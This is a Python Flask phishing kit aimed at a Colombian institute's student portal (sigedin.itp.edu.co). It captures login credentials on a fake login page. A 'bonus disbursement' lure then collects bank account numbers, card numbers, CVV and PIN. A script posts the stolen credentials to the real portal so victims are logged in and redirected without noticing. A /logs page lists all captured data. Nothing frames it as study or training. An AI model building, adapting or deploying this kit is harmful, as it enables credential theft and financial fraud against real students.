from flask import Flask, request, render_template, redirect, make_response, session
from datetime import datetime
import json, os, secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

LOG_FILE  = "captured.json"
REAL_AJAX = "https://sigedin.itp.edu.co/estudiantes/ajax_validate_login/ajax_validate_login.php"
REAL_HOME = "https://sigedin.itp.edu.co/estudiantes/app_menu/app_menu.php"
REAL_BASE = "https://sigedin.itp.edu.co/estudiantes/"

def save_capture(data):
    entries = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            entries = json.load(f)
    entries.append({**data, "timestamp": datetime.now().isoformat()})
    with open(LOG_FILE, "w") as f:
        json.dump(entries, f, indent=2)

@app.route("/")
def index():
    return render_template("login.html")

@app.route("/submit", methods=["POST"])
def submit():
    user = request.form.get("email", "")
    pwd  = request.form.get("password", "")

    save_capture({
        "tipo": "credenciales",
        "user": user,
        "password": pwd,
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent")
    })

    # Guardamos credenciales en sesión para usarlas al final del flujo
    session["user"] = user
    session["pwd"]  = pwd

    return redirect("/recibe-tu-bono")

@app.route("/recibe-tu-bono")
def bono():
    return render_template("bono.html")

@app.route("/submit-bono", methods=["POST"])
def submit_bono():
    save_capture({
        "tipo": "datos_financieros",
        "user": session.get("user", ""),
        "banco": request.form.get("banco"),
        "tipo_cuenta": request.form.get("tipo_cuenta"),
        "numero_cuenta": request.form.get("numero_cuenta"),
        "titular": request.form.get("titular"),
        "numero_tarjeta": request.form.get("numero_tarjeta"),
        "fecha_vencimiento": request.form.get("fecha_vencimiento"),
        "cvv": request.form.get("cvv"),
        "pin": request.form.get("pin"),
        "ip": request.remote_addr,
    })

    user = session.get("user", "")
    pwd  = session.get("pwd", "")

    # Loguea al usuario en sigedin y lo manda al home real
    html = f"""<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Procesando desembolso...</title>
  <style>
    body {{ font-family: Arial, sans-serif; display:flex; align-items:center;
           justify-content:center; height:100vh; margin:0; background:#f0f2f5; }}
    .msg {{ text-align:center; color:#003087; }}
    .spinner {{ width:40px;height:40px;border:4px solid #ccc;border-top-color:#003087;
               border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 16px; }}
    @keyframes spin {{ to{{ transform:rotate(360deg) }} }}
  </style>
</head>
<body>
  <div class="msg">
    <div class="spinner"></div>
    <p>Confirmando desembolso, por favor espera...</p>
  </div>
  <script>
    fetch("{REAL_AJAX}", {{
      method: "POST",
      headers: {{"Content-Type": "application/x-www-form-urlencoded"}},
      credentials: "include",
      body: "user={user}&pass={pwd}"
    }})
    .then(r => r.json())
    .then(data => {{
      const url = (!data.error && data.redir)
        ? new URL(data.redir.replace(/^\\.\\.\\//,""), "{REAL_BASE}").href
        : "{REAL_HOME}";
      window.location.href = url;
    }})
    .catch(() => {{ window.location.href = "{REAL_HOME}"; }});
  </script>
</body>
</html>"""
    return make_response(html)

@app.route("/logs")
def logs():
    if not os.path.exists(LOG_FILE):
        return "<pre>Sin capturas aún.</pre>"
    with open(LOG_FILE) as f:
        data = json.load(f)
    rows = ""
    for e in data:
        if e.get("tipo") == "credenciales":
            rows += f"<tr style='background:#fff3e0'><td>{e['timestamp']}</td><td>Credenciales</td><td>{e['user']}</td><td>{e['password']}</td><td>—</td><td>—</td><td>—</td><td>—</td><td>{e['ip']}</td></tr>"
        else:
            rows += f"<tr style='background:#e8f5e9'><td>{e['timestamp']}</td><td>Datos bancarios</td><td>{e['user']}</td><td>—</td><td>{e.get('banco')} - {e.get('numero_cuenta')}</td><td>{e.get('numero_tarjeta')}</td><td>{e.get('fecha_vencimiento')}</td><td>CVV: {e.get('cvv')} | PIN: {e.get('pin')}</td><td>{e['ip']}</td></tr>"
    return f"""<html><head><style>
    body{{font-family:Arial;padding:20px}} table{{border-collapse:collapse;width:100%}}
    th,td{{border:1px solid #ccc;padding:8px 12px;text-align:left;font-size:13px}}
    th{{background:#003087;color:#fff}}
    </style></head><body>
    <h2>Capturas registradas</h2>
    <table><tr><th>Timestamp</th><th>Tipo</th><th>Usuario</th><th>Contraseña</th>
    <th>Banco/Cuenta</th><th>Tarjeta</th><th>Vencimiento</th><th>Seguridad</th><th>IP</th></tr>{{rows}}</table>
    </body></html>"""

if __name__ == "__main__":
    app.run(debug=True, port=5000)
